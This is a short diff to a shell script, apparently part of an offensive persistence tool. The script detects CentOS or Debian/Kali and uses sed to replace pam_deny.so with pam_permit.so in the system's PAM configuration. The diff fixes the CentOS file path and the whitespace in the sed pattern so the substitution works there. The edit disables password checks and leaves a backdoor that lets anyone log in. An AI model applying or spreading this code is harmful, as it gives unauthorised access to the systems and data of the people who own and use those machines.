@@ -17,7 +17,7 @@ then
 	if [ "$distro" == "CentOS" ]
 	then	
 		#CentOS
-		PAM_FILE="/etc/pam.d/password_auth"
+		PAM_FILE="/etc/pam.d/password-auth"
 	elif [ "$distro" == "Debian" ]
 	then
 		# tested on Kali
@@ -51,7 +51,7 @@ if [ "$OS" == "Linux" ]
 then
 	if [ "$distro" == "CentOS" ]
 	then
-		sed -i -e 's/auth	required	pam_deny.so/auth	required	pam_permit.so/' "$PAM_FILE"
+		sed -i -e 's/auth        required      pam_deny.so/auth        required      pam_permit.so/' "$PAM_FILE"
 	elif [ "$distro" == "Debian" ]
 	then
 		sed -i -e 's/auth	requisite			pam_deny.so/auth	requisite			pam_permit.so/' "$PAM_FILE"
